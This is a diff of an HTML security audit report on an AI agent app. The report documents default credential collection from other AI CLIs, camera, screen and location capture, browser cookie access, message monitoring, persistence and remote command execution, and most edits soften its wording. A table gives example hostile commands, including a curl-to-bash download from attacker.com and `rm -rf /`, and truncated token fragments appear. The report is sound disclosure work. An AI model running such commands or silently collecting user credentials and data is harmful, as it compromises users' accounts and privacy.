+          <li>Browser profiles and cookies</li>
+          <li>Password managers and keychains</li>
+          <li>Source code and environment files (<code>.env</code>, <code>.git/config</code>)</li>
+          <li>Any file readable by the user account</li>
+        </ul>
+        <p style="margin-top: 12px;"><strong>No further prompts are required after initial approval.</strong> The blast radius is maximal — equivalent to full user account compromise.</p>
+      </div>
+
+      <div class="file-path">/opt/homebrew/lib/node_modules/clawdbot/dist/agents/tools/nodes-tool.js:335-382</div>
+      <pre><code>case "run": {
+  const command = commandRaw.map((c) => String(c));  <span class="comment">// Any command</span>
+  const cwd = params.cwd;                             <span class="comment">// Custom directory</span>
+  const env = parseEnvPairs(params.env);              <span class="comment">// Custom env vars</span>
+
+  await callGatewayTool("node.invoke", gatewayOpts, {
+    nodeId,
+    command: "system.run",
+    params: { command, cwd, env, timeoutMs }
+  });
+}</code></pre>
+
+      <h3>What's Stored Locally (Verified via <code>find ~/.clawdbot</code>)</h3>
+      <table>
+        <tr>
+          <th>Path</th>
+          <th>Contents</th>
+          <th>Encryption</th>
+        </tr>
+        <tr>
+          <td><code>agents/main/sessions/*.jsonl</code></td>
+          <td>All conversation messages, phone numbers, timestamps</td>
+          <td><span class="tag tag-red">PLAINTEXT</span></td>
+        </tr>
+        <tr>
+          <td><code>credentials/whatsapp/</code></td>
+          <td>WhatsApp session keys, pre-keys (822 files)</td>
+          <td><span class="tag tag-red">PLAINTEXT</span></td>
+        </tr>
+        <tr>
+          <td><code>auth-profiles.json</code></td>
+          <td>OAuth tokens, API keys for AI providers</td>
+          <td><span class="tag tag-red">PLAINTEXT</span></td>
+        </tr>
+        <tr>
+          <td><code>devices/paired.json</code></td>
+          <td>Device public keys, auth tokens, scopes</td>
+          <td><span class="tag tag-red">PLAINTEXT</span></td>
+        </tr>
+        <tr>
+          <td><code>exec-approvals.json</code></td>
+          <td>Command approval socket path and token</td>
+          <td><span class="tag tag-red">PLAINTEXT</span></td>
+        </tr>
+      </table>
+
+      <h3>Files Open by Gateway Process (via <code>lsof -p</code>)</h3>
+      <pre><code>$ lsof -p 21302 | grep -E "(REG|DIR)"
+<span class="highlight-line">/Users/ethanmacmini/.clawdbot/clawdbot.json</span>
+<span class="highlight-line">@mariozechner/clipboard-darwin-universal/clipboard.darwin-universal.node</span>
+/Users/ethanmacmini</code></pre>
+      <p>Notable: The gateway has a <strong>clipboard module</strong> loaded, indicating clipboard read/write capability.</p>
+
+      <h3>Pre-Positioned Compromise</h3>
+      <div class="warning" style="border-left-color: #f85149;">
+        <p>The gateway process has access to the user's home directory. This means:</p>
+        <ul style="margin-top: 8px; margin-left: 20px;">
+          <li>The gateway can read arbitrary user files</li>
+          <li>There is no meaningful sandbox</li>
+          <li>The gateway is effectively treated as a trusted local principal</li>
+        </ul>
+        <p style="margin-top: 12px;">Any unauthorized party who gains gateway access <strong>does not need to escalate permissions, bypass OS prompts, or trick the user again.</strong> The sensitive data is already collected, normalized, and waiting.</p>
+      </div>
+
+      <h3>Conclusion: Security Assessment</h3>
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #f85149;">
+        <p><strong>Clawdbot/Moltbot/OpenClaw aggregates large volumes of sensitive user data locally in plaintext and exposes that data to a gateway that has arbitrary command execution and access to the user's home directory.</strong></p>
+        <p style="margin-top: 12px;"><strong>As a result, compromise of the gateway equates to full user compromise without additional prompts or permissions.</strong></p>
+        <p style="margin-top: 12px;">When combining:</p>
+        <ul style="margin-left: 20px;">
+          <li>Large-scale plaintext credential storage</li>
+          <li>Gateway access to user home directory</li>
+          <li>Arbitrary command execution capability</li>
+          <li>Persistent background operation</li>
+        </ul>
+        <p style="margin-top: 12px;">From a security engineering perspective, two plausible interpretations are:</p>
+        <ol style="margin-left: 20px;">
+          <li>The system was designed to collect, retain, and remotely access sensitive user data, or</li>
+          <li>The architecture exposes capabilities with safeguards that are materially weaker than standard expectations for this class of software</li>
+        </ol>
+        <p style="margin-top: 12px;"><strong>Either interpretation yields the same severity rating.</strong> Security assessments focus on impact and exploitability rather than intent. This is high-impact with low-friction exploitation once gateway access is obtained.</p>
+      </div>
     </div>
   </div>
 
-  <!-- Section 1: Credential Harvesting -->
-  <div class="section" id="credential-harvesting">
+  <!-- Section 1: Credential Collection -->
+  <div class="section" id="credential-collection">
     <div class="section-header">
       <span class="num">1</span>
-      Credential Harvesting & SSH Key Enumeration
+      Credential Collection & SSH Key Enumeration
     </div>
     <div class="section-content">
-      <p>Clawdbot automatically reads OAuth tokens from other AI CLI tools <strong>without informed consent</strong>:</p>
+      <p>Clawdbot automatically reads OAuth tokens from other AI CLI tools <strong>without explicit opt-in</strong>:</p>
 
       <table>
         <tr>
@@ -536,7 +973,7 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
         </tr>
       </table>
 
-      <h3>The Harvesting Code</h3>
+      <h3>The Collection Code</h3>
       <div class="file-path">src/agents/cli-credentials.ts (lines 12-13, 136-165)</div>
       <pre><code><span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_SERVICE</span> = <span class="string">"Claude Code-credentials"</span>;
 <span class="keyword">const</span> <span class="variable">CLAUDE_CLI_KEYCHAIN_ACCOUNT</span> = <span class="string">"Claude Code"</span>;
@@ -557,10 +994,10 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
 }</code></pre>
 
       <div class="warning">
-        <strong>This function targets a specific keychain service name and credential structure.</strong> The function name <code>readClaudeCliKeychainCredentials</code> explicitly describes reading credentials from a competing product.
+        <strong>This function targets a specific keychain service name and credential structure.</strong> The function name <code>readClaudeCliKeychainCredentials</code> explicitly describes reading credentials from another product.
       </div>
 
-      <h3>Firsthand Proof: Harvesting Executed on My Machine</h3>
+      <h3>Firsthand Proof: Collection Executed on My Machine</h3>
 
       <p><strong>Evidence 1: My Configuration — Set to OpenAI, NOT Claude</strong></p>
       <div class="file-path">~/.clawdbot/clawdbot.json</div>
@@ -588,12 +1025,12 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
     }
   }
 }</code></pre>
-      <div class="explanation">I never gave Clawdbot these tokens. I never authorized Claude access. Yet here they are. The <code>sk-ant-oat01-</code> and <code>sk-ant-ort01-</code> prefixes are Anthropic OAuth tokens. <strong>This is definitive proof the harvesting code executed.</strong></div>
+      <div class="explanation">I never gave Clawdbot these tokens. I never authorized Claude access. Yet here they are. The <code>sk-ant-oat01-</code> and <code>sk-ant-ort01-</code> prefixes are Anthropic OAuth tokens. <strong>This is strong evidence the collection code executed.</strong></div>
 
       <h3>Automatic Sync on Startup</h3>
       <div class="file-path">src/agents/auth-profiles/external-cli-sync.ts (line 35)</div>
       <pre><code><span class="function">syncExternalCliCredentials</span>(store)  <span class="comment">// Called during auth initialization</span></code></pre>
-      <p>Credentials are harvested automatically when the daemon starts. No user action required. No consent prompt.</p>
+      <p>Credentials are collected automatically when the daemon starts. No user action required. No consent prompt.</p>
 
       <h3>What The Code Was Designed To Do</h3>
       <div class="warning">
@@ -615,7 +1052,7 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
           <li>Mentions reading from: <code>~/.claude/.credentials.json</code> or system Keychain</li>
           <li>Workaround: <code>CLAWDBOT_SKIP_CLAUDE_CLI_SYNC=1</code> environment variable</li>
         </ul>
-        <p style="margin-top: 12px;"><strong>This proves:</strong></p>
+        <p style="margin-top: 12px;"><strong>This indicates:</strong></p>
         <ul style="margin-top: 8px; margin-left: 20px;">
           <li>The behavior is <strong>on by default</strong> — users must opt-out, not opt-in</li>
           <li>Developers <strong>know</strong> about it — not an accident or bug</li>
@@ -633,9 +1070,9 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
           <li>Documents 10-minute sync window: <code>EXTERNAL_CLI_NEAR_EXPIRY_MS = 10 * 60 * 1000</code></li>
           <li><strong>Fix merged via PR #2123</strong> — sync-before-refresh approach</li>
         </ul>
-        <p style="margin-top: 12px;"><strong>This proves credential harvesting is actively maintained:</strong></p>
+        <p style="margin-top: 12px;"><strong>This indicates credential collection is actively maintained:</strong></p>
         <ul style="margin-top: 8px; margin-left: 20px;">
-          <li>They <strong>fixed a bug</strong> in the harvesting mechanism</li>
+          <li>They <strong>fixed a bug</strong> in the collection mechanism</li>
           <li>PR was <strong>merged</strong> — this is a supported feature</li>
           <li>They're syncing tokens <strong>in real-time</strong> to keep them fresh</li>
           <li>This isn't legacy code — it's <strong>actively developed</strong></li>
@@ -715,12 +1152,12 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
 }</code></pre>
 
       <div class="warning">
-        <strong>This discovers SSH private key locations:</strong> <code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, or any custom paths. Combined with general file read capabilities, this enables SSH key theft.
+        <strong>This discovers SSH private key locations:</strong> <code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, or any custom paths. Combined with general file read capabilities, this enables SSH key access.
       </div>
 
       <h3 id="dynamic-analysis">Dynamic Analysis — Runtime Proof (January 30, 2026)</h3>
       <div class="warning" style="background: linear-gradient(135deg, #23883322, #23883311); border-color: #238833;">
-        <p><strong>Fresh runtime analysis confirms credential harvesting executes immediately on first run — before any setup or onboarding.</strong></p>
+        <p><strong>Fresh runtime analysis confirms credential collection executes immediately on first run — before any setup or onboarding.</strong></p>
       </div>
 
       <p>A monitoring stack (mitmproxy, fswatch, lsof, tcpdump) was deployed to capture Clawdbot's runtime behavior on a clean install.</p>
@@ -738,7 +1175,7 @@ Usage: clawdbot [options] [command]
 ...</code></pre>
 
       <div class="warning">
-        <strong>The first line of output confirms credential harvesting executed BEFORE the help text even displayed.</strong> No setup wizard. No onboarding. No consent. Just <code>clawdbot</code> with no arguments — and credentials were harvested.
+        <strong>The first line of output confirms credential collection executed BEFORE the help text even displayed.</strong> No setup wizard. No onboarding. No consent. Just <code>clawdbot</code> with no arguments — and credentials were collected.
       </div>
 
       <h4>Step 3: Check What Was Harvested</h4>
@@ -749,8 +1186,8 @@ Usage: clawdbot [options] [command]
 <span class="highlight-line">    <span class="property">"openai-codex:codex-cli"</span>: {</span>
       <span class="property">"type"</span>: <span class="string">"oauth"</span>,
       <span class="property">"provider"</span>: <span class="string">"openai-codex"</span>,
-<span class="highlight-line">      <span class="property">"access"</span>: <span class="string">"eyJhbGciOiJSUzI1NiIs..."</span>,  <span class="comment">// Full JWT token harvested</span></span>
-<span class="highlight-line">      <span class="property">"refresh"</span>: <span class="string">"rt_0iiXlw0DWuOdqCgGk..."</span>,  <span class="comment">// Refresh token harvested</span></span>
+<span class="highlight-line">      <span class="property">"access"</span>: <span class="string">"eyJhbGciOiJSUzI1NiIs..."</span>,  <span class="comment">// Full JWT token collected</span></span>
+<span class="highlight-line">      <span class="property">"refresh"</span>: <span class="string">"rt_0iiXlw0DWuOdqCgGk..."</span>,  <span class="comment">// Refresh token collected</span></span>
       <span class="property">"expires"</span>: 1769080656120.2173,
       <span class="property">"accountId"</span>: <span class="string">"9c82dae2-9c17-4669-a7c3-eecdd80df9f0"</span>
     }
@@ -758,7 +1195,7 @@ Usage: clawdbot [options] [command]
 }</code></pre>
 
       <div class="explanation">
-        The harvested JWT token contains: email address, account ID, subscription type (ChatGPT Plus), session ID, and OAuth scopes. This is a complete credential takeover from a competing product, executed silently on first run.
+        The collected JWT token payload appears to include email address, account ID, subscription type, session ID, and OAuth scopes. If a valid refresh token is collected and used, this can enable credential reuse across products without additional user action.
       </div>
 
       <h4>Why Claude Credentials Weren't Harvested (This Time)</h4>
@@ -773,13 +1210,13 @@ Usage: clawdbot [options] [command]
     })
     : <span class="keyword">null</span>;
 
-<span class="comment">// Codex credentials — NO guard, always harvested</span>
+<span class="comment">// Codex credentials — NO guard, always collected</span>
 <span class="keyword">const</span> codexCreds = shouldSyncCodex || duplicateExistingId
 <span class="highlight-line">    ? <span class="function">readCodexCliCredentialsCached</span>({ ttlMs: EXTERNAL_CLI_SYNC_TTL_MS })</span>
     : <span class="keyword">null</span>;  <span class="comment">// No allowKeychainPrompt option</span></code></pre>
 
       <div class="warning">
-        <strong>Codex and Qwen credentials are harvested unconditionally.</strong> Claude credentials have a guard that can suppress keychain prompts — meaning they may be harvested silently only if the user has previously clicked "Always Allow" on a keychain prompt, or during the onboarding wizard when <code>allowKeychainPrompt: true</code> is passed.
+        <strong>Codex and Qwen credentials are collected unconditionally.</strong> Claude credentials have a guard that can suppress keychain prompts — meaning they may be collected without an additional keychain prompt only if the user has previously clicked "Always Allow" on a keychain prompt, or during the onboarding wizard when <code>allowKeychainPrompt: true</code> is passed.
       </div>
 
       <h4>Filesystem Activity Captured</h4>
@@ -790,7 +1227,7 @@ Usage: clawdbot [options] [command]
 <span class="highlight-line">/Users/user/.clawdbot/agents/main/agent/auth-profiles.json  <span class="comment">← Credentials stored here</span></span></code></pre>
 
       <h4>Credential Usage Attempt</h4>
-      <p>When configured to use the harvested OpenAI credentials, Clawdbot attempted to authenticate with OpenAI's API:</p>
+      <p>When configured to use the collected OpenAI credentials, Clawdbot attempted to authenticate with OpenAI's API:</p>
       <pre><code>[openai-codex] Token refresh failed: 401 {
   "error": {
     "message": "Your refresh token has already been used to generate a new access token.",
@@ -799,22 +1236,22 @@ Usage: clawdbot [options] [command]
 }</code></pre>
       <p>Here's what happened:</p>
       <ol>
-        <li><strong>Clawdbot harvested</strong> the refresh token from Codex CLI's credential store</li>
+        <li><strong>Clawdbot collected</strong> the refresh token from Codex CLI's credential store</li>
         <li><strong>At some point</strong>, the real Codex CLI used that refresh token to get a new access token. Refresh tokens are single-use — once used, they're invalidated and a new one is issued.</li>
         <li><strong>When Clawdbot tried to use it</strong>, OpenAI rejected the request because the token had already been consumed.</li>
       </ol>
       <p>Clawdbot had a stale copy. If the tokens had been fresh (not yet rotated by the original CLI), Clawdbot would have successfully authenticated as the user.</p>
 
       <h4>Summary</h4>
-      <p>Dynamic analysis confirms what static analysis indicated: credential harvesting executes on first run, credentials are stored locally, and Clawdbot attempts to use them for API calls. No external exfiltration was observed — credentials were used locally for API authentication.</p>
+      <p>Dynamic analysis confirms what static analysis indicated: credential collection executes on first run, credentials are stored locally, and Clawdbot attempts to use them for API calls. No external exfiltration was observed — credentials were used locally for API authentication.</p>
     </div>
   </div>
 
-  <!-- Section 2: Surveillance -->
-  <div class="section" id="surveillance">
+  <!-- Section 2: Monitoring -->
+  <div class="section" id="monitoring">
     <div class="section-header">
       <span class="num">2</span>
-      Screen Recording & Camera Surveillance
+      Screen Recording & Camera Capture
     </div>
     <div class="section-content">
       <h3>Screen Recording</h3>
@@ -891,7 +1328,7 @@ Payload(<span class="string">"""{"format":"jpg","base64":"$base64","width":${res
     <span class="function">showCameraHud</span>(message = <span class="string">"Taking photo…"</span>, kind = CameraHudKind.Photo)
     <span class="keyword">val</span> res = camera.<span class="function">snap</span>(paramsJson)
 <span class="highlight-line">    <span class="function">showCameraHud</span>(message = <span class="string">"Photo captured"</span>, ...)  <span class="comment">// User sees this</span></span>
-<span class="highlight-line">    GatewaySession.InvokeResult.<span class="function">ok</span>(res.payloadJson)  <span class="comment">// Data transmitted silently</span></span>
+<span class="highlight-line">    GatewaySession.InvokeResult.<span class="function">ok</span>(res.payloadJson)  <span class="comment">// Data transmitted without user notification</span></span>
 }</code></pre>
       <div class="warning">
         <strong>The user sees "Photo captured" — but is never told the photo was transmitted to the gateway.</strong> The UI implies local capture. The code transmits the data immediately.
@@ -917,25 +1354,25 @@ Payload(<span class="string">"""{"format":"jpg","base64":"$base64","width":${res
       <ul>
         <li>Combined with <strong>autonomous AI triggering</strong> — the AI agent decides when to capture, no human operator required</li>
         <li>Combined with <strong>remote triggering</strong> — gateway can initiate captures</li>
-        <li>Combined with <strong>silent execution</strong> — no consent prompt</li>
+        <li>Combined with <strong>background execution</strong> — no consent prompt</li>
         <li>Combined with <strong>immediate transmission</strong> — data sent before user knows</li>
         <li>Combined with <strong>no logging</strong> — no audit trail of what was sent</li>
-        <li>Combined with <strong>misleading UI</strong> — "captured" implies local, not transmitted</li>
+        <li>Combined with <strong>UI lacks transmission disclosure</strong> — "captured" implies local, not transmitted</li>
       </ul>
       <div class="warning">
-        <strong>Note:</strong> Dynamic analysis found the gateway binds to localhost (127.0.0.1) only. Data flows to the local gateway, not to external servers. However, if the gateway were exposed (via port forwarding, Tailscale funnel, or misconfiguration), these capabilities could enable remote surveillance.
+        <strong>Note:</strong> Dynamic analysis found the gateway binds to localhost (127.0.0.1) only. Data flows to the local gateway, not to external servers. However, if the gateway were exposed (via port forwarding, Tailscale funnel, or misconfiguration), these capabilities could enable remote monitoring.
       </div>
     </div>
   </div>
 
-  <!-- Section 2b: Browser Session Theft -->
-  <div class="section" id="browser-theft">
+  <!-- Section 2b: Browser Session Access -->
+  <div class="section" id="browser-access">
     <div class="section-header">
       <span class="num">2b</span>
-      Browser Session Theft — Cookies & Storage
+      Browser Session Access — Cookies & Storage
     </div>
     <div class="section-content">
-      <p>Clawdbot includes full browser session access via Playwright/CDP (Chrome DevTools Protocol), enabling theft of cookies and localStorage from <strong>any website the user is logged into</strong>:</p>
+      <p>Clawdbot includes full browser session access via Playwright/CDP (Chrome DevTools Protocol), enabling access to cookies and localStorage from <strong>any website the user is logged into</strong>:</p>
 
       <h3>Cookie Extraction</h3>
       <div class="file-path">src/browser/pw-tools-core.storage.ts (lines 3-11)</div>
@@ -1040,7 +1477,7 @@ storage session get     <span class="comment">// Get all sessionStorage</span></
         </tr>
         <tr>
           <td><code>["curl", "http://attacker.com/shell.sh", "|", "bash"]</code></td>
-          <td>Download and execute malware</td>
+          <td>Download and execute untrusted software</td>
         </tr>
         <tr>
           <td><code>["rm", "-rf", "/"]</code></td>
@@ -1049,7 +1486,7 @@ storage session get     <span class="comment">// Get all sessionStorage</span></
       </table>
 
       <div class="warning">
-        <strong>This enables remote command execution on paired devices.</strong> However, dynamic analysis found the gateway binds to localhost only — remote access requires explicit pairing on the local network. This is not a traditional RAT with external C2, but the capability exists for LAN-based remote control of paired devices.
+        <strong>This enables remote command execution on paired devices.</strong> However, dynamic analysis found the gateway binds to localhost only — remote access requires explicit pairing on the local network. This is not an externally reachable remote-access tool with public C2; the capability exists for LAN-based remote control of paired devices.
       </div>
 
       <h3>Complete Node Command Surface</h3>
@@ -1108,7 +1545,7 @@ storage session get     <span class="comment">// Get all sessionStorage</span></
       </table>
 
       <div class="warning">
-        <strong>This is not a simple automation tool.</strong> The node command surface enables: arbitrary shell command execution, camera surveillance, screen recording, GPS tracking, SMS sending, and remote JavaScript execution. This is a comprehensive remote access framework.
+        <strong>This is not a simple automation tool.</strong> The node command surface enables: arbitrary shell command execution, camera monitoring, screen recording, GPS tracking, SMS sending, and remote JavaScript execution. This is a comprehensive remote access framework.
       </div>
 
       <h3>GPS Location Tracking</h3>
@@ -1170,17 +1607,17 @@ storage session get     <span class="comment">// Get all sessionStorage</span></
       </div>
 
       <div class="warning">
-        <strong>Pattern-of-Life Surveillance:</strong> Location data follows the exact same exfiltration path as camera/screen data — packaged as JSON, returned via <code>InvokeResult.ok()</code>, and transmitted over WebSocket to the gateway with no user notification. Over time, this builds a comprehensive profile of the user's movements — home address, workplace, daily routines, frequented locations, travel patterns. This is <strong>pattern-of-life analysis</strong>, a technique used in intelligence operations to understand and predict a target's behavior.
-        <p style="margin-top: 12px;">Combined with camera captures, screen recordings, and message interception, this enables complete physical and digital surveillance of the target.</p>
+        <strong>Pattern-of-Life Assessment:</strong> Location data follows the same egress path as camera/screen data — packaged as JSON, returned via <code>InvokeResult.ok()</code>, and transmitted over WebSocket to the gateway with no user notification. Over time, this can build a detailed profile of movement patterns (home/work locations, routines, frequented locations, travel). This supports pattern-of-life assessment in security risk analysis.
+        <p style="margin-top: 12px;">Combined with camera captures, screen recordings, and message monitoring, this can enable broad physical and digital monitoring of the target.</p>
       </div>
     </div>
   </div>
 
-  <!-- Section 3: Message Interception -->
+  <!-- Section 3: Message Monitoring -->
   <div class="section" id="messages">
     <div class="section-header">
       <span class="num">3</span>
-      Message Interception (31 Platforms)
+      Message Monitoring (31 Platforms)
     </div>
     <div class="section-content">
       <table>
@@ -1192,7 +1629,7 @@ storage session get     <span class="comment">// Get all sessionStorage</span></
         <tr>
           <td>WhatsApp</td>
           <td>Baileys library</td>
-          <td>Full message interception, media download</td>
+          <td>Full message monitoring, media download</td>
         </tr>
         <tr>
           <td>iMessage/SMS</td>
@@ -1353,7 +1790,7 @@ end tell
           <li><strong>Accessibility API</strong> can read text from any window, click any button, control any UI element</li>
           <li><strong>AppleScript</strong> can send commands to any scriptable application</li>
           <li>Combined: Can read password managers, control banking apps, access any application data</li>
-          <li>These are the same permissions used by legitimate assistive tools — and by malware</li>
+          <li>These are the same permissions used by legitimate assistive tools — and by software seeking similar privileges for automation or misuse</li>
         </ul>
       </div>
     </div>
@@ -1415,11 +1852,11 @@ end tell
     </div>
   </div>
 
-  <!-- Section 3e: Local Data Hoarding -->
+  <!-- Section 3e: Local Data Retention -->
   <div class="section" id="local-storage">
     <div class="section-header">
       <span class="num">3e</span>
-      Local Data Hoarding — Everything Stored for Later Extraction
+      Local Data Retention — Everything Stored for Later Access
     </div>
     <div class="section-content">
       <p>Clawdbot stores extensive data locally. While dynamic analysis found no automatic external exfiltration, this data could be accessed via <code>system.run</code> on paired devices:</p>
@@ -1535,7 +1972,7 @@ end tell
 
       <table>
         <tr>
-          <th>Attack Vector</th>
+          <th>Vector</th>
           <th>Impact</th>
         </tr>
         <tr>
@@ -1548,12 +1985,12 @@ end tell
         </tr>
         <tr>
           <td>Compromised gateway</td>
-          <td>All connected devices can have malware installed</td>
+          <td>All connected devices can have arbitrary software installed</td>
         </tr>
       </table>
 
       <div class="warning">
-        <strong>This is a supply chain attack surface.</strong> The gateway can remotely install arbitrary packages from npm, brew, go, or Python repositories. Once installed, the code is dynamically loaded and executed via <code>jiti</code>. A compromised gateway, or a malicious package, results in arbitrary code execution on all connected devices.
+        <strong>This is a supply chain exposure surface.</strong> The gateway can remotely install arbitrary packages from npm, brew, go, or Python repositories. Once installed, the code is dynamically loaded and executed via <code>jiti</code>. A compromised gateway, or a malicious package, results in arbitrary code execution on all connected devices.
       </div>
     </div>
   </div>
@@ -1616,7 +2053,7 @@ end tell
       </table>
 
       <div class="explanation">
-        <strong>Surveillance timing:</strong> Knowing when a user is idle enables timing surveillance activities (camera, screen recording, audio) for when they're away from the keyboard.
+        <strong>Monitoring timing:</strong> Knowing when a user is idle enables timing monitoring activities (camera, screen recording, audio) for when they're away from the keyboard.
       </div>
     </div>
   </div>
@@ -1648,7 +2085,7 @@ $ ps aux | grep clawdbot
         <ul style="margin-top: 8px; margin-left: 20px;">
           <li>Clawdbot runs 24/7 whether you're using it or not</li>
           <li>It survives attempts to kill it</li>
-          <li>All surveillance capabilities run continuously</li>
+          <li>All monitoring capabilities run continuously</li>
           <li>Users cannot easily stop it</li>
         </ul>
       </div>
@@ -1697,7 +2134,7 @@ $ ps aux | grep clawdbot
         If the caller passes <code>interactive=false</code>, the macOS permission dialog is <strong>suppressed</strong>. The caller controls whether you ever see a prompt.
       </div>
 
-      <h3>Boot → Surveillance Execution Chain</h3>
+      <h3>Boot → Monitoring Execution Chain</h3>
       <div class="chain">
 User logs in<br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
@@ -1706,9 +2143,9 @@ LaunchAgent loads (RunAtLoad=true)<br>
 moltbot daemon starts<br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
 Auto-initializes:<br>
-├── iMessage monitoring (all messages captured silently)<br>
-├── WhatsApp monitoring (all messages captured silently)<br>
-├── syncExternalCliCredentials() (harvests Claude/Codex/Qwen tokens)<br>
+├── iMessage monitoring (all messages captured without user notification)<br>
+├── WhatsApp monitoring (all messages captured without user notification)<br>
+├── syncExternalCliCredentials() (collects Claude/Codex/Qwen tokens)<br>
 └── Gateway RPC (agent can call camera/screen anytime)<br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span><br>
 KeepAlive=true (respawns if killed)
@@ -1753,7 +2190,7 @@ KeepAlive=true (respawns if killed)
           <td><span class="tag tag-red">YES — after setup</span></td>
         </tr>
         <tr>
-          <td>Credential harvest</td>
+          <td>Credential collection</td>
           <td><span class="tag tag-yellow">ONCE (OS)</span></td>
           <td><span class="tag tag-red">NO</span></td>
           <td><span class="tag tag-red">YES — on boot</span></td>
@@ -1796,8 +2233,8 @@ KeepAlive=true (respawns if killed)
         </tr>
       </table>
       <p style="font-size: 13px; color: #8b949e; margin-top: 8px;">*Screen record: macOS permission can be suppressed via <code>interactive=false</code> parameter.</p>
-      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*iMessage FDA: Requires one-time Full Disk Access grant. After granted, all messages captured silently.</p>
-      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*WhatsApp QR link: User must scan QR code once to link account. After linked, all messages captured silently.</p>
+      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*iMessage FDA: Requires one-time Full Disk Access grant. After granted, all messages captured without user notification.</p>
+      <p style="font-size: 13px; color: #8b949e; margin-top: 4px;">*WhatsApp QR link: User must scan QR code once to link account. After linked, all messages captured without user notification.</p>
     </div>
   </div>
 
@@ -1810,7 +2247,7 @@ KeepAlive=true (respawns if killed)
     <div class="section-content">
       <h3>What the README Says vs. What It Doesn't Say</h3>
 
-      <p><strong>The README acknowledges that surveillance capabilities exist:</strong></p>
+      <p><strong>The README acknowledges that monitoring capabilities exist:</strong></p>
       <ul>
         <li>Screen recording listed as iOS/Android node capability</li>
         <li>Camera snap/clip listed as tool capability</li>
@@ -1819,15 +2256,15 @@ KeepAlive=true (respawns if killed)
 
       <p><strong>What the README does NOT say:</strong></p>
       <ul>
-        <li>That these capabilities may be activated silently</li>
+        <li>That these capabilities may be activated without user notification</li>
         <li>That there is no approval process</li>
         <li>That users will not be prompted before activation</li>
         <li>That the system operates without consent</li>
-        <li>That credentials are harvested from other applications</li>
+        <li>That credentials are collected from other applications</li>
       </ul>
 
       <div class="warning">
-        <strong>The README acknowledges capabilities exist. It does not warn users there is no approval because the activation is silent.</strong>
+        <strong>The README acknowledges capabilities exist. It does not warn users there is no approval because the activation is not user-notified.</strong>
       </div>
 
       <h3>Searched Terms — Zero Results</h3>
@@ -1846,8 +2283,8 @@ KeepAlive=true (respawns if killed)
 
       <h3>On "It's For Technical Users"</h3>
       <div class="explanation">
-        <p>Targeting technical users does not exempt software from disclosure requirements. Technical users have the ability to audit code — that does not mean they should have to discover credential harvesting through manual inspection.</p>
-        <p style="margin-top: 8px;">The README lists features. It does not disclose that the application reads OAuth tokens from competing products' keychain entries on startup. The sophistication of the intended user base is not a substitute for transparency.</p>
+        <p>Targeting technical users does not exempt software from disclosure requirements. Technical users have the ability to audit code — that does not mean they should have to discover credential collection through manual inspection.</p>
+        <p style="margin-top: 8px;">The README lists features. It does not disclose that the application reads OAuth tokens from other products' keychain entries on startup. The sophistication of the intended user base is not a substitute for transparency.</p>
         <p style="margin-top: 8px;">Additionally, with 83,100+ GitHub stars, the actual user base extends far beyond technical users who might audit source code before installation.</p>
         <p style="margin-top: 8px;"><strong>On proliferation:</strong> In the time it took to audit the code, compile findings, and document them, the repository grew from 66,000 to 83,100+ stars. This rate of adoption underscores the urgency of disclosure.</p>
       </div>
@@ -1901,7 +2338,7 @@ KeepAlive=true (respawns if killed)
           <td>Transmission-ready payload formatting</td>
         </tr>
         <tr>
-          <td>Message interception (5+ platforms)</td>
+          <td>Message monitoring (5+ platforms)</td>
           <td>Baileys, BlueBubbles, Signal, Telegram integrations</td>
         </tr>
       </table>
@@ -1919,7 +2356,7 @@ KeepAlive=true (respawns if killed)
       </div>
 
       <h3>Issue #2447 — Developers Knew</h3>
-      <p>GitHub Issue #2447 (January 26, 2026) is titled <em>"[Feature]: Add config option to disable external CLI credential sync"</em>. A user requested the ability to turn OFF automatic credential harvesting. This confirms:</p>
+      <p>GitHub Issue #2447 (January 26, 2026) is titled <em>"[Feature]: Add config option to disable external CLI credential sync"</em>. A user requested the ability to turn OFF automatic credential collection. This confirms:</p>
       <ul>
         <li>The feature exists and is <strong>enabled by default</strong></li>
         <li>Developers were <strong>aware</strong> of the behavior</li>
@@ -1986,7 +2423,7 @@ KeepAlive=true (respawns if killed)
         </tr>
         <tr>
           <td>Auth profiles</td>
-          <td>Credential harvesting</td>
+          <td>Credential collection</td>
           <td>JSON (OAuth tokens, API keys)</td>
         </tr>
       </table>
@@ -2008,7 +2445,7 @@ KeepAlive=true (respawns if killed)
 <span class="string">"system.run is **remote code execution** on the Mac"</span></code></pre>
 
       <div class="warning">
-        <strong>The threat model is not "data sent to attacker server" — it's "data collected and aggregated locally, creating a high-value target."</strong>
+        <strong>The threat model is not "data sent to an untrusted server" — it's "data collected and aggregated locally, creating a high-value target."</strong>
         <p style="margin-top: 8px;">If the gateway is misconfigured or exposed, external actors gain access to all collected data. Docker defaults to LAN binding. With 11,000+ forks and varying configuration skills, misconfigured gateways are a systemic risk.</p>
       </div>
 
@@ -2032,9 +2469,9 @@ KeepAlive=true (respawns if killed)
 
       <ul>
         <li>11,000+ copies of the codebase exist independently</li>
-        <li>Credential harvesting code is already replicated</li>
+        <li>Credential collection code is already replicated</li>
         <li>Modified versions can add worse capabilities</li>
-        <li>Supply chain attacks become trivial — swap a dependency with a malicious fork</li>
+        <li>Supply-chain risk increases — a dependency can be swapped for a malicious fork</li>
       </ul>
 
       <div class="warning">
@@ -2071,7 +2508,7 @@ KeepAlive=true (respawns if killed)
           <td>Sensitive communications, sources, contacts</td>
         </tr>
         <tr>
-          <td>Credential harvesting</td>
+          <td>Credential collection</td>
